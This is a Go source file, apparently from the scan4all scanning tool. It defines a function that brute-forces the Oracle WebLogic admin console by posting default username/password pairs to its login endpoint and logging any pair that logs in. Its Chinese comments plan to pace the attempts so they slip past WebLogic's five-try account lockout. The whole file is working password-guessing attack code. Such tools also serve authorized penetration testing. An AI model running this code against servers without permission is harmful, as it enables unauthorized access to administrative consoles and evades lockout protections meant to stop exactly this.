package brute

import (
	"fmt"
	"github.com/GhostTroops/scan4all/lib/util"
)

// weblogic默认的登陆尝试次数为5次，
//
//	5次失败则weblogic用户锁定，即使你已经找到正确的密码，也不能登陆到console
//	默认的锁定时间为30分钟，后期可以设置策略，自动后台运行，每30分钟走一轮不重复的密码
//	后期再优化间隔35分钟后继续后面的密码
func Weblogic_brute(url string) (username string, password string) {
	if req, err := util.HttpRequset(url+"/console/login/LoginForm.jsp", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 {
			var pay string
			for uspa := range weblogicuserpass {
				pay = fmt.Sprintf("j_username=%s&j_password=%s", weblogicuserpass[uspa].username, weblogicuserpass[uspa].password)
				if req2, err2 := util.HttpRequset(url+"/console/j_security_check", "POST", pay, true, nil); err2 == nil {
					if util.StrContains(req2.RequestUrl, "console.portal") {
						util.SendLog(req2.RequestUrl, "weblogic_brute", fmt.Sprintf("Found vuln Weblogic password|%s:%s|%s\n", weblogicuserpass[uspa].username, weblogicuserpass[uspa].password, url+"/console/"), pay)
						return weblogicuserpass[uspa].username, weblogicuserpass[uspa].password
					}
				}
			}
			return "login_page", ""
		}
	}
	return "", ""
}
